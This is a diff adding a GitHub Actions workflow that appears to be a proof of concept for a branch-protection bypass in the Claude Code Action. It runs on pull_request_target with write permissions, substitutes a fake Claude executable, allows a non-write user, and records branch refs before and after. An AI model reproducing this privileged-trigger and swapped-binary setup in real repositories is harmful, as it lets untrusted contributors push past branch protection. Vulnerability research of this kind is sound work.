@@ -1,0 +1,52 @@
+name: Claude Hash Ref E2E PoC (branch protection)
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  issues: write
+
+jobs:
+  e2e-protected:
+    if: contains(github.event.pull_request.head.ref, 'protected')
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Checkout base repository
+        uses: actions/checkout@v6
+
+      - name: Mark fake Claude executable
+        run: chmod +x .github/fake-claude.mjs
+
+      - name: Show current branch protection info
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set +e
+          echo "::group::branch protection get"
+          gh api "repos/${{ github.repository }}/branches/main/protection" || true
+          echo "::endgroup::"
+          echo "::group::rules for main"
+          gh api "repos/${{ github.repository }}/rules/branches/main" || true
+          echo "::endgroup::"
+
+      - name: Run vulnerable Claude Code Action path
+        uses: anthropics/claude-code-action@6c0083bb7289c31716797a039b6367b3079cc46e
+        with:
+          prompt: "PoC: write e2e-action-marker.txt using commit signing."
+          anthropic_api_key: "fake-key-not-used-by-fake-claude"
+          github_token: ${{ github.token }}
+          allowed_non_write_users: "s0kex"
+          use_commit_signing: true
+          path_to_claude_code_executable: ${{ github.workspace }}/.github/fake-claude.mjs
+          show_full_output: "true"
+
+      - name: Refs after run
+        if: always()
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          gh api "repos/${{ github.repository }}/git/refs/heads" | tee refs-after.json
